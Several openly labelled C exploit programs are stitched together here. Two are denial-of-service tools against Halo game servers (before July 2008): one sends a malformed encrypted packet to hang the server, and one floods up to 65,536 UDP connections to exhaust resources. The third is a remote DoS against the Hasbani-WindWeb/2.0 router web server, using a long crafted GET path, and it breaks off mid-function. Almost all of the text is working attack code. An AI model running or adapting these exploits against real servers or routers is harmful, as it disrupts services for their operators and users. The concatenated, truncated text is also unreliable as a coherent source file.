int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int putcc(u8 *buff, int chr, int len);
int putmm(u8 *buff, u8 *data, int len);
int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    struct  linger  ling = {1,1};
    u32     ver;
    int     sd,
            b,
            len,
            tryver  = 0;
    u16     port    = PORT;
    u8      buff[BUFFSZ],
            enckey[16],
            deckey[16],
            hash[17],
            *psdk,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Halo <= 1.0.7.615 (before 30 Jul 2008) endless loop "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            //"\n"  // not needed to specify
            //"works also with servers protected by password without knowing the keyword\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr  = resolv(argv[1]);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    ver = halo_info(buff, &peer);
    if(!ver) ver = 612000;
    psdk = buff + 7;

    for(;;) {
        printf("\n- connect\n");

        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();
        setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));

        p = buff;
        p += putxx(p, 0xfefe,   16);    // gssdk_header
        p += putxx(p, 1,        8);
        p += putxx(p, htons(0), 16);
        p += putxx(p, htons(0), 16);
        memset(psdk, '0',       32);
        gssdkcr(psdk, psdk,     0);     p += 32;

        len = send_recv(sd, buff, p - buff, buff, BUFFSZ, &peer, 1);
        while(buff[2] != 2) {
            len = send_recv(sd, NULL, 0, buff, BUFFSZ, &peer, 1);
        }

        p = buff;
        p += putxx(p, 0xfefe,   16);    // gssdk_header
        p += putxx(p, 3,        8);
        p += putxx(p, htons(1), 16);
        p += putxx(p, htons(1), 16);
        gssdkcr(psdk, buff + 39, 0);    p += 32;
        halo_generate_keys(hash, NULL, enckey);
        p += putmm(p, enckey,   16);    // Halo handshake
        p += putxx(p, ver,      32);

        len = send_recv(sd, buff, p - buff, buff, BUFFSZ, &peer, 1);
        while((buff[2] != 4) && (buff[2] != 5) && (buff[2] != 0x68)) {
            len = send_recv(sd, NULL, 0, buff, BUFFSZ, &peer, 1);
        }

        if((buff[2] == 5) && (buff[7] == 6)) {
            close(sd);
            printf("  server full ");
            sleep(ONESEC);
            continue;
        } else if((buff[2] == 5) && (buff[7] == 4)) {
            close(sd);
            if(ver == 6013999) {
                printf("\nError: unknown server version\n");
                exit(1);
            } else if(ver == 609999) {
                ver = 6013999;
            } else {
                ver = 609999;
            }
            printf("  try version %d", ver);
            continue;
        } else if((buff[2] == 5) && (buff[7] == 5)) {
            if(tryver < 5) {
                ver -= 1000;            // servers 1.07 need a different version
            } else if(tryver == 5) {
                ver = 2;
            } else if(tryver == 6) {
                ver = 1;
            } else {
                printf("\nError: unknown server version\n");
                exit(1);
            }
            tryver++;
            printf("  try version %d", ver);
            continue;
        } else if(buff[2] == 0x68) {
            close(sd);
            printf("  disconnected");
            continue;
        } else if(buff[2] != 4) {
            close(sd);
            printf("\nError: you have been disconnected for unknown reasons (%02x %02x)\n", buff[2], buff[7]);
            exit(1);
        }

        halo_generate_keys(hash, psdk, deckey);
        halo_generate_keys(hash, psdk, enckey);

        p = buff;
        p += putxx(p, 0xfefe,   16);    // gssdk_header
        p += putxx(p, 0,        8);
        p += putxx(p, htons(2), 16);
        p += putxx(p, htons(3), 16);

        b = 0;
        b = write_bits(3, 11, p, b);
        b = write_bits(1, 1, p, b); // this part is not important, it's only needed to send a total of 4 bytes
        b = write_bits(0, 6, p, b); // in version 1.04 this particular type of packet causes a silent unhandling of the server (process active but packets are not handled)
        b = write_bits('A', 8, p, b);
        p += (((b+7)&(~7)) >> 3);

        p += putxx(p, halo_crc32(psdk, p - psdk), 32);
        halo_tea_encrypt(psdk, p - psdk, enckey);

        printf("- send malformed packet\n");
        send_recv(sd, buff, p - buff, NULL, 0, &peer, 1);
        send_recv(sd, buff, p - buff, NULL, 0, &peer, 1);
        sleep(ONESEC);

        close(sd);
        break;
    }

    printf("- wait one second and check server:\n");
    sleep(ONESEC);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    len = send_recv(sd, "\\status\\", 8, buff, BUFFSZ, &peer, 0);
    if(len < 0) {
        printf("\n  Server IS vulnerable!!!\n");
    } else {
        printf("\n  Server doesn't seem vulnerable\n");
    }
    close(sd);
    return(0);
}



u32 halo_info(u8 *buff, struct sockaddr_in *peer) {
    u32     ver         = 0;
    int     sd,
            len;
    u8      *gamever    = NULL,
            *p;

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    printf("\n- send query\n");
    len = send_recv(sd, "\\status\\", 8, buff, BUFFSZ, peer, 0);
    if(len < 0) goto quit;

    printf("\n- handle reply:\n");
    gs_handle_info(buff, len, 1, '\\', 0, 0,
        "gamever",  &gamever,
        NULL,       NULL);

    if(gamever) {
        p = strrchr(gamever, '.');
        if(p) {
            p++;
        } else {
            p = gamever;
        }
        ver = atoi(p) * 1000;
    }

quit:
    close(sd);
    return(ver);
}



int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...) {
    va_list ap;
    int     i,
            args,
            found;
    u8      **parz,
            ***valz,
            *p,
            *limit,
            *par,
            *val;

    va_start(ap, rear);
    for(i = 0; ; i++) {
        if(!va_arg(ap, u8 *))  break;
        if(!va_arg(ap, u8 **)) break;
    }
    va_end(ap);

    args = i;
    parz = malloc(args * sizeof(u8 *));
    valz = malloc(args * sizeof(u8 **));

    va_start(ap, rear);
    for(i = 0; i < args; i++) {
        parz[i]  = va_arg(ap, u8 *);
        valz[i]  = va_arg(ap, u8 **);
        *valz[i] = NULL;
    }
    va_end(ap);

    found  = 0;
    limit  = data + datalen - rear;
    *limit = 0;
    data   += front;
    par    = NULL;
    val    = NULL;

    for(p = data; (data < limit) && p; data = p + 1, nt++) {
        p = strchr(data, chr);
        if(p) *p = 0;

        if(nt & 1) {
            if(!par) continue;
            val = data;
            printf("  %35s %s\n", par, val);

            for(i = 0; i < args; i++) {
                if(!stricmp(par, parz[i])) *valz[i] = val;
            }
        } else {
            par = data;
        }
    }

    free(parz);
    free(valz);
    return(found);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry = 2,
            len;

    if(in) {
        while(retry--) {
            //fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!out) return(0);
            if(!timeout(sd, 2)) break;
        }
    } else {
        if(timeout(sd, 3) < 0) retry = -1;
    }

    if(retry < 0) {
        if(!err) return(-1);
        printf("\nError: socket timeout, no reply received\n\n");
        exit(1);
    }

    //fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int putcc(u8 *buff, int chr, int len) {
    memset(buff, chr, len);
    return(len);
}



int putmm(u8 *buff, u8 *data, int len) {
    memcpy(buff, data, len);
    return(len);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> (i << 3)) & 0xff;
    }
    return(bytes);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*
    Copyright 2008 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include "gssdkcr.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        2302
#define BUFFSZ      8192



u32 halo_info(u8 *buff, struct sockaddr_in *peer);
int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...);
int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int putcc(u8 *buff, int chr, int len);
int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer,
                        peerl;
    struct  linger  ling = {1,1};
    time_t  start_time;
    u32     ver;
    int     sd,
            i,
            len,
            attack,
            checktime   = 1;
    u16     port        = PORT;
    u8      buff[BUFFSZ],
            *psdk,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Halo <= 1.07.615 (before 30 Jul 2008) resources consumption "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <bugs> <host> [port(%hu)]\n"
            "\n"
            "Bugs:\n"
            " 1 = the resources will be occupied and freed each 60 seconds, this bug\n"
            "     requires only the sending of one single packet and, so, is very fast\n"
            " 2 = the resources will be occupied forever\n"
            "\n"
            "Note: your outgoing ICMP packets MUST be blocked for testing the vulnerability\n"
            "      this is the default configuration on Windows with the firewall activated\n"
            "\n", argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);

    if(argc > 3) port = atoi(argv[3]);
    peer.sin_addr.s_addr  = resolv(argv[2]);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    peerl.sin_addr.s_addr = INADDR_ANY;
    peerl.sin_port        = htons(time(NULL));
    peerl.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    ver = halo_info(buff, &peer);
    if(!ver) ver = 612000;
    psdk = buff + 7;

    start_time = time(NULL);

    printf("\n- start the testing:\n");
    for(i = 0; i <= 0xffff; i++) {
        printf("\r  connection %d: ", i);

        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();
        setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
        do {
            peerl.sin_port++;
        } while(bind(sd, (struct sockaddr *)&peerl, sizeof(struct sockaddr_in)) < 0);

        p = buff;
        p += putxx(p, 0xfefe,   16);    // gssdk_header
        p += putxx(p, 1,        8);
        p += putxx(p, htons(0), 16);
        p += putxx(p, htons(0), 16);
        memset(psdk, '0',       32);
        gssdkcr(psdk, psdk,     0);     p += 32;

        if(attack != 1) {
            len = send_recv(sd, buff, p - buff, buff, BUFFSZ, &peer, 1);
            while(buff[2] != 2) {
                if(buff[2] == 0x68) printf(" you have been disconnected (players_per_IP limit)");
                len = send_recv(sd, NULL, 0, buff, BUFFSZ, &peer, 1);
            }

            p = buff;
            p += putxx(p, 0xfefe,   16);    // gssdk_header
            p += putxx(p, 3,        8);
            p += putxx(p, htons(1), 16);
            p += putxx(p, htons(1), 16);
            gssdkcr(psdk, buff + 39, 0);    p += 32;
            p += putcc(p, 0,        16);    // Halo handshake (not needed)
            p += putxx(p, ver,      32);    // this is NOT important in this bug!
        }

        len = send_recv(sd, buff, p - buff, NULL, 0, &peer, 1);
        close(sd);

        if((attack == 1) && checktime && ((time(NULL) - start_time) >= 60)) {
            printf("\n"
                "- one minute is passed, the resources on the server are freeing.\n"
                "  check the server manually\n");
            checktime = 0;
        }
    }

    printf("\n- done\n");
    return(0);
}



u32 halo_info(u8 *buff, struct sockaddr_in *peer) {
    u32     ver         = 0;
    int     sd,
            len;
    u8      *gamever    = NULL,
            *p;

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    printf("\n- send query\n");
    len = send_recv(sd, "\\status\\", 8, buff, BUFFSZ, peer, 0);
    if(len < 0) goto quit;

    printf("\n- handle reply:\n");
    gs_handle_info(buff, len, 1, '\\', 0, 0,
        "gamever",  &gamever,
        NULL,       NULL);

    if(gamever) {
        p = strrchr(gamever, '.');
        if(p) {
            p++;
        } else {
            p = gamever;
        }
        ver = atoi(p) * 1000;
    }

quit:
    close(sd);
    return(ver);
}



int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...) {
    va_list ap;
    int     i,
            args,
            found;
    u8      **parz,
            ***valz,
            *p,
            *limit,
            *par,
            *val;

    va_start(ap, rear);
    for(i = 0; ; i++) {
        if(!va_arg(ap, u8 *))  break;
        if(!va_arg(ap, u8 **)) break;
    }
    va_end(ap);

    args = i;
    parz = malloc(args * sizeof(u8 *));
    valz = malloc(args * sizeof(u8 **));

    va_start(ap, rear);
    for(i = 0; i < args; i++) {
        parz[i]  = va_arg(ap, u8 *);
        valz[i]  = va_arg(ap, u8 **);
        *valz[i] = NULL;
    }
    va_end(ap);

    found  = 0;
    limit  = data + datalen - rear;
    *limit = 0;
    data   += front;
    par    = NULL;
    val    = NULL;

    for(p = data; (data < limit) && p; data = p + 1, nt++) {
        p = strchr(data, chr);
        if(p) *p = 0;

        if(nt & 1) {
            if(!par) continue;
            val = data;
            printf("  %35s %s\n", par, val);

            for(i = 0; i < args; i++) {
                if(!stricmp(par, parz[i])) *valz[i] = val;
            }
        } else {
            par = data;
        }
    }

    free(parz);
    free(valz);
    return(found);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry = 2,
            len;

    if(in) {
        while(retry--) {
            fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!out) return(0);
            if(!timeout(sd, 2)) break;
        }
    } else {
        if(timeout(sd, 3) < 0) retry = -1;
    }

    if(retry < 0) {
        if(!err) return(-1);
        printf("\nError: socket timeout, no reply received\n\n");
        exit(1);
    }

    fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int putcc(u8 *buff, int chr, int len) {
    memset(buff, chr, len);
    return(len);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> (i << 3)) & 0xff;
    }
    return(bytes);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*
       _______         ________           .__        _____          __
___  __\   _  \   ____ \_____  \          |  |__    /  |  |   ____ |  | __
\  \/  /  /_\  \ /    \  _(__  <   ______ |  |  \  /   |  |__/ ___\|  |/ /
 >    <\  \_/   \   |  \/       \ /_____/ |   Y  \/    ^   /\  \___|    <
/__/\_ \\_____  /___|  /______  /         |___|  /\____   |  \___  >__|_ \
      \/      \/     \/       \/   26\09\05    \/      |__|      \/     \/

[i] Title:              Hasbani-WindWeb/2.0 - HTTP GET  Remote DoS
[i] Discovered by:      Expanders
[i] Exploit by:         Expanders

[ What is Hasbani-WindWeb/2.0 ]

Hasbani server is a httpd created for menaging ethernet routers and adsl modems.

[ Why HTTPD crash? ]

Causes of DoS are not perfecly known by me 'cos i can't debug a chip-integrated http daemon.
Btw seems that Hasbani enter a loop in a GET /..:..:..etc. condition, causes that when an attacker reguest a long crafted string
server enter an endless loop with conseguenly crash of the httpd.

NOTE: This exploit DON'T drop down victim's adsl connection!

[ Timeline ]

This vulnerability was not comunicated because i did'n find Hasbani's vendor.

[ Links ]

www.x0n3-h4ck.org



*/

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>

#define BUGSTR "GET %s HTTP/1.0\n\n\n" // Command where bug reside


char evilrequest[] = {
0x2f, 0x2e, 0x2e, 0x3a,
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a,
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x78, 0x30, 0x6e, 0x33, 
0x2d, 0x68, 0x34, 0x63, 0x6b, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 
0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 
0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 0x2e, 0x3a, 0x2e, 
0x2e, 0x3a, 0x2e, 0x2e };

fd_set readfds;
int banner();
int usage(char *filename);
int remote_connect( char* ip, unsigned short port );

int banner() {
  printf("\n       _______         ________           .__        _____          __     \n");
  printf("___  __\\   _  \\   ____ \\_____  \\          |  |__    /  |  |   ____ |  | __ \n");
  printf("\\  \\/  /  /_\\  \\ /    \\  _(__  <   ______ |  |  \\  /   |  |__/ ___\\|  |/ / \n");
  printf(" >    <\\  \\_/   \\   |  \\/       \\ /_____/ |   Y  \\/    ^   /\\  \\___|    <  \n");
  printf("/__/\\_ \\\\_____  /___|  /______  /         |___|  /\\____   |  \\___  >__|_ \\ \n");
  printf("      \\/      \\/     \\/       \\/               \\/      |__|      \\/     \\/ \n\n");
  printf("[i] Title:              \tHasbani-WindWeb/2.0 - HTTP GET  Remote DoS\n");
  printf("[i] Discovered by:      \tExpanders\n");
  printf("[i] Proof of concept by:\tExpanders\n\n");
  return 0;
}

int usage(char *filename) {
  printf("Usage: \t%s HOST <port>   ::   default HTTPD port: 80\n\n",filename);
  exit(0);
}

int remote_connect( char* ip, unsigned short port )
{
  int s;
  struct sockaddr_in remote_addr;
  struct hostent* host_addr;

  memset ( &remote_addr, 0x0, sizeof ( remote_addr ) );
  if ( ( host_addr = gethostbyname ( ip ) ) == NULL )
  {
   printf ( "[X] Cannot resolve \"%s\"\n", ip );
   exit ( 1 );
  }
  remote_addr.sin_family = AF_INET;
  remote_addr.sin_port = htons ( port );
  remote_addr.sin_addr = * ( ( struct in_addr * ) host_addr->h_addr );
  if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
  {
   printf ( "[X] Socket failed!\n" );
   exit(1);
  }
  if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
  {
   printf ( "[X] Failed connecting!\n" );
          exit(1);
  }
  return ( s );
}


int main(int argc, char *argv[]) {
    int s,n;
    unsigned int rcv;
    char *request;
    char recvbuf[256];
    banner();
    if( argc < 3)
        argv[2] = "80";
    else if ((atoi(argv[2]) < 1) || (atoi(argv[2]) > 65534))
         usage(argv[0]);
    if( (argc < 2) )
        usage(argv[0]);
    request = (char *) malloc(1024);
    printf("[+] Connecting to remote host\n");
    s = remote_connect(argv[1],atoi(argv[2]));
    sleep(1);
    printf("[+] Creating buffer\n");
